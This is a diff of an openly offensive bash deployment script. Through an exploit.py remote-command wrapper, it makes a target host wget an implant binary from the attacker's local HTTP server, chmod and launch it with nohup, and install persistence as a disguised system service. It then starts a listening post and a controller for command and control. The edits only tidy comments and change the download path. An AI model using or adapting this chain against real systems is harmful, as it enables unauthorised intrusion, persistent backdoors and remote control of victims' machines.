@@ -59,20 +59,18 @@ send_cmd() {
     python3 exploit.py "http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/" "$1"
 }
 
-# ----------------------------------------------------------------------
+
 # 1. Start local HTTP server
-# ----------------------------------------------------------------------
 echo "[*] Starting HTTP server at http://$LOCAL_IP:$PORT"
 python3 -m http.server "$PORT" >/dev/null 2>&1 &
 SERVER_PID=$!
 sleep 2
 
-# ----------------------------------------------------------------------
+
 # 2. Upload implant & persistence script
-# ----------------------------------------------------------------------
 echo "[*] Uploading implant binary..."
 send_cmd "mkdir -p $REMOTE_DIR"
-send_cmd "wget -q http://$LOCAL_IP:$PORT/$IMPLANT_NAME -O $REMOTE_IMPLANT"
+send_cmd "wget -q http://$LOCAL_IP:$PORT/Implant/$IMPLANT_NAME -O $REMOTE_IMPLANT"
 send_cmd "chmod +x $REMOTE_IMPLANT"
 
 echo "[*] Uploading persistence script..."
@@ -84,9 +82,8 @@ send_cmd "/tmp/$PERSIST_NAME -n $SERVICE_NAME -b $REMOTE_IMPLANT -d 'Network Hel
 send_cmd "rm -f /tmp/$PERSIST_NAME"
 echo "[+] Persistence installed."
 
-# ----------------------------------------------------------------------
+
 # 3. Stop HTTP server & launch implant
-# ----------------------------------------------------------------------
 echo "[*] Stopping HTTP server..."
 kill $SERVER_PID 2>/dev/null || true
 
@@ -94,9 +91,7 @@ echo "[*] Launching implant now..."
 send_cmd "cd $REMOTE_DIR && nohup ./$IMPLANT_NAME >/dev/null 2>&1 &"
 echo "[+] Implant is running."
 
-# ----------------------------------------------------------------------
-# 4. Start listening post (with proper .env loading)
-# ----------------------------------------------------------------------
+# 4. Start listening post 
 if [ -n "$LISTENING_POST" ]; then
     LP_DIR=$(dirname "$LISTENING_POST")
     LP_FILE=$(basename "$LISTENING_POST")
@@ -106,9 +101,8 @@ if [ -n "$LISTENING_POST" ]; then
     sleep 3
 fi
 
-# ----------------------------------------------------------------------
-# 5. Start controller (also in its own directory if needed)
-# ----------------------------------------------------------------------
+
+# 5. Start controller 
 if [ -n "$CONTROLLER" ]; then
     CTRL_DIR=$(dirname "$CONTROLLER")
     CTRL_FILE=$(basename "$CONTROLLER")
